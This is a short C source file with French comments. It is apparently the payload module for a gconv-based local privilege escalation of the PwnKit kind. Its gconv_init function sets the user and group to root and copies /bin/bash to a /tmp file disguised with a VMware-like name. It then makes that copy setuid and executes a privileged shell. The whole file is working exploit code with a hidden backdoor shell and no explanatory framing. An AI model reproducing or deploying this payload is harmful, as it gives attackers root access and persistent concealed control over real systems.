#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init()
{
    // setenv("NOM_VARIABLE", "VALEUR", ECRASER_SI_EXISTE)
    setenv("PATH", "/usr/bin:/bin:/usr/sbin:/sbin", 1);
    //forcer root reel pas effectif
    setgid(0);
    setuid(0);
    setgroups(0);

    system("cp /bin/bash /tmp/vmware-000000000S311by4G3NtP4Th0G3n3");
    system("chmod +s /tmp/vmware-000000000S311by4G3NtP4Th0G3n3");
    //remplace totalement rocess en cours tranquil quoi
    char *args[] = {"/bin/bash","-p",NULL};
    char *env[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin",NULL};
    execve("/bin/bash",args,env);
}


